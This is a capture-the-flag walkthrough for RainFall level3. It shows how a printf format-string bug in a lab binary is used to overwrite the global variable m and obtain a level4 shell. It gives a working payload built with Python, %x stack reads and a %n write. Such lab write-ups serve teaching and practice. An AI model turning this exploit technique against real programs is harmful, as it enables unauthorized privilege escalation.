# Level3
Level3 is about abusing global variables and formatted strings exploits

# Tools
GDB

# Walkthrough
The home of level3 contains a binary, called level3. 

Using dogbolt, we can decompile the binary and we see a global variable m, and a `printf` taking some user input as the formatted string.

This can be leveraged to perform some formatted string exploits.

Using `objdump -t`, we can get the address of m on the stack:
```bash
objdump -t level3
...
804988c g     O .bss	00000004              m
...
```

Using the `printf` bug, we can see the content of the stack using `%x` formatters. We see that we started writing 3 addresses after we started dumping data (we write the address first, `804988c`, which is written by the fourth `%x`).

```
level3@RainFall:~$ rm -rf attack.txt; python -c 'print("\x8c\x98\x04\x08" + "A" * 60 + "%x " * 19)' > attack.txt
level3@RainFall:~$ cat attack.txt - | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA200 b7fd1ac0 b7ff37d0 804988c 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 
```

`%x` formatters pop data from the stack, when the `%n` push the length of what has already been written on the stack.

Before giving us access to the terminal, the programme checks whether m is 64 or not. Thus, we need to write 64 characters before pushing that value onto the stack and modifying the value of m. 

We need the 3 `%x` to pop enough data from to stack to write at the proper place, which accounts for `200 b7fd1ac0 b7ff37d0 ` -> 22 characters.
The address of m, `"\x8c\x98\x04\x08"` is 4 characters.
Thus we need to write 64 - 22 - 4 = 38 padding characters. 
Finally, we push the value with `%n`.

```
level3@RainFall:~$ rm -rf attack.txt; python -c 'print("\x8c\x98\x04\x08" + "A" * 38 + "%x " * 3 + "%n")' > attack.txt
level3@RainFall:~$ cat attack.txt - | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA200 b7fd1ac0 b7ff37d0
Wait what?!
whoami
level4
```

# Resources
[2001 Paper on Formatted Strings exploits](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)
[Exploiting Formatted Strings](https://security.stackexchange.com/questions/174696/how-to-exploit-variables-value#comment335877_174730)
[OWASP Formatted String Exploit](https://owasp.org/www-community/attacks/Format_string_attack)
[LiveOverflow's Binary Exploit 0x11 - Formatted Strings](https://www.youtube.com/watch?v=0WvrSfcdq1I)